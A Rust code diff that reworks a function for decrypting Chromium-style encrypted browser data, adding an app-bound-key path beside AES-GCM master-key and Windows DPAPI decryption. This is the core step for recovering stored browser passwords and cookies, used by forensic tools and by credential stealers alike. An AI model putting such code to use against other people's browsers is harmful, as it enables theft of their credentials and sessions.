@@ -46,47 +46,25 @@ pub unsafe fn crypt_unprotect_data(data: &[u8]) -> Option<Vec<u8>> {
 /// versions and chooses the appropriate decryption method based on the version byte in
 /// the input buffer.
 ///
-/// # Parameters
-/// - `buffer`: A byte slice containing the encrypted data.
-/// - `master_key`: An optional byte slice of the master key used for AES-GCM decryption in v1x format.
-/// - `app_bound_encryption_key`: An optional byte slice of the app-bound encryption key used for v2x format.
-///
-/// # Returns
-/// - `Some(String)`: The decrypted string if decryption is successful.
-/// - `None`: If the buffer is empty, the version is unsupported, or required keys are missing.
-///
-/// # Chromium Encryption Versions
-/// - **v2x**: Requires `app_bound_encryption_key`. 
-///   ### Currently NOT implemented!.
-/// - **v1x**: Requires `master_key`. The buffer is expected to contain:
-///     - IV (12 bytes) starting at index 3,
-///     - Ciphertext up to the last 16 bytes,
-///     - Tag (16 bytes) at the end of the buffer.
-///     Decryption is performed using AES-GCM.
-/// - **Unprefixed/legacy format**: Uses Windows Data Protection API (`CryptUnprotectData`) directly with no additional keys.
-///
 /// # Safety
 /// This function is marked `unsafe` because it may call into Windows APIs (`CryptUnprotectData`) or perform unchecked
 /// pointer dereferencing in the decryption process. Use with caution and ensure inputs are valid.
-///
 pub unsafe fn decrypt_data(buffer: &[u8], master_key: Option<&[u8]>, app_bound_encryption_key: Option<&[u8]>) -> Option<String> {
     if buffer.is_empty() {
         return None
     }
 
-    match &buffer[1] {
-        b'2' if app_bound_encryption_key.is_some() => {
-            // Todo: Not implemented yet
-            None
-        },
-        b'1' if master_key.is_some() => {
-            let iv = &buffer[3..15];
-            let ciphertext = &buffer[15..buffer.len() - 16];
-            let tag = &buffer[buffer.len() - 16..];
-            decrypt_aes_gcm(iv, ciphertext, tag, master_key?)
-        },
-        _ => Some(String::from_utf8_lossy(&crypt_unprotect_data(buffer)?).to_string())
-    }
+    app_bound_encryption_key
+        .and_then(|abek| decrypt_internal(buffer, abek))
+        .or_else(|| master_key.and_then(|mk| decrypt_internal(buffer, mk)))
+        .or_else(|| crypt_unprotect_data(buffer).map(|bytes| String::from_utf8_lossy(&bytes).to_string()))
+}
+
+unsafe fn decrypt_internal(buffer: &[u8], key: &[u8]) -> Option<String> {
+    let iv = &buffer[3..15];
+    let ciphertext = &buffer[15..buffer.len() - 16];
+    let tag = &buffer[buffer.len() - 16..];
+    decrypt_aes_gcm(iv, ciphertext, tag, key)
 }
 
 unsafe fn decrypt_aes_gcm(iv: &[u8], ciphertext: &[u8], tag: &[u8], encryption_key: &[u8]) -> Option<String> {
